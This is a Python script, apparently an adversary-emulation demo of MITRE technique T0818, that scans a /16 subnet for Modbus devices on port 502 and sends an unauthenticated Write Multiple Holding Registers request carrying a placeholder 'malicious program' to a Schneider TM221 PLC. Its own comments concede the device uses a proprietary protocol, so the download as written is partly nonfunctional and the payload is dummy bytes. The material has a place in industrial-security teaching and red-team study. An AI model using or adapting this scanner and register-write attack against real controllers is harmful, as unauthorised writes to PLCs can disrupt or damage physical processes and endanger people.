# Python script demonstrating Program Download for Lateral Movement (MITRE T0818)
# This script simulates the actions of an adversary performing a program download
# to a Schneider Electric TM221CE16R PLC.
# It relies on the Modbus protocol for communication and assumes the adversary
# has already compromised a machine on the network with access to the PLC.

import socket
import struct
import sys

# Configuration
PLC_IP = None  # Initialize to None, will be discovered if needed
MODBUS_PORT = 502
MODBUS_SLAVE_ADDRESS = 1  # As defined in the PLC configuration (Serial Line SL1)

# Placeholder for the malicious program (replace with actual bytecode)
# In a real attack, this would be crafted to modify the PLC's behavior.
MALICIOUS_PROGRAM = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A"  # Example

def find_plc_ip(known_subnet="192.168.9"):
    """
    Attempts to find the PLC's IP address by scanning a subnet for Modbus devices.
    This is a simplified discovery method and may not work in all environments.
    """
    print(f"Attempting to discover PLC IP address in subnet: {known_subnet}.x.x")
    for i in range(1, 255):
        for j in range(1,255): #Checking a /16 because we were given 192.168.9.24. In reality we would only check one /24
            ip = f"{known_subnet}.{i}.{j}"
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)  # Short timeout
                sock.connect((ip, MODBUS_PORT))

                # Minimal Modbus request to check if a device responds.  Read Holding Registers, count 1, starting at address 0
                transaction_id = b'\x00\x01'  # Arbitrary transaction ID
                protocol_id = b'\x00\x00'
                length = b'\x00\x06'
                unit_id = struct.pack("B", MODBUS_SLAVE_ADDRESS)  # Slave Address
                function_code = b'\x03'  # Read Holding Registers
                start_address = b'\x00\x00'  # Start at register 0
                quantity = b'\x00\x01'  # Read 1 register

                modbus_request = transaction_id + protocol_id + length + unit_id + function_code + start_address + quantity

                sock.send(modbus_request)
                response = sock.recv(1024)

                if response:
                    print(f"Found potential PLC at IP address: {ip}")
                    return ip
                sock.close()

            except (socket.timeout, socket.error) as e:
                pass # Ignore timeout and connection refused errors
    print("PLC IP address not found in the specified subnet.")
    return None


def craft_modbus_program_download_request(program_data):
    """
    Crafts a Modbus request to upload a new program to the PLC.

    Note: This is a simplified example and assumes a very basic Modbus-based
    program download mechanism.  Real PLC program downloads are far more complex
    and vendor-specific, involving multiple requests for authentication,
    memory allocation, data transfer, and checksum verification.

    This is a *placeholder* function.  It needs to be adapted based on the
    specific Modbus commands (if any) supported by the TM221CE16R for program download.
    The TM221 PLC uses a proprietary protocol, not standard Modbus, for program upload/download. This script attempts to show how the attack would work even though Modbus is not the correct protocol.

    For example, if the PLC used a sequence of Modbus write commands to specific
    memory addresses to upload the program, this function would need to be
    modified to generate those specific commands.

    """
    #In this example lets assume that we are writing to multiple holding registers to place the malicious program.
    transaction_id = b'\x00\x02'  # Arbitrary transaction ID
    protocol_id = b'\x00\x00'
    unit_id = struct.pack("B", MODBUS_SLAVE_ADDRESS)  # Slave Address

    #Assume we are going to write the program one register at a time. Two bytes per register.
    function_code = b'\x10' # Write Multiple Holding Registers.

    start_address = b'\x00\x0A' #Example start address.

    quantity_of_registers = struct.pack(">H",len(program_data)//2)  #Number of registers to write. Each register is two bytes

    byte_count = struct.pack("B",len(program_data)) #Number of bytes being written.

    data = program_data

    length = struct.pack(">H",7 + len(program_data))

    modbus_request = transaction_id + protocol_id + length + unit_id + function_code + start_address + quantity_of_registers+ byte_count + data

    return modbus_request


def send_modbus_request(ip_address, request):
    """Sends a Modbus request to the PLC."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip_address, MODBUS_PORT))
        sock.sendall(request)
        response = sock.recv(1024)  # Adjust buffer size if needed
        sock.close()
        return response
    except socket.error as e:
        print(f"Socket error: {e}")
        return None


def main():
    global PLC_IP #Use the global variable

    # Discover PLC IP address if not already set.
    if not PLC_IP:
        PLC_IP = find_plc_ip()
        if not PLC_IP:
            print("Could not automatically find the PLC IP address. Exiting.")
            sys.exit(1)

    print(f"Using PLC IP address: {PLC_IP}")

    # 1. Craft the malicious program download request
    print("Crafting malicious program download request...")
    download_request = craft_modbus_program_download_request(MALICIOUS_PROGRAM)

    # 2. Send the program download request to the PLC
    print("Sending program download request to PLC...")
    response = send_modbus_request(PLC_IP, download_request)

    if response:
        print("Program download request sent. Response received (may not indicate success):")
        print(response)
    else:
        print("Failed to send program download request or receive a response.")

    print("Program Download simulation complete. The PLC is now potentially compromised.")

if __name__ == "__main__":
    main()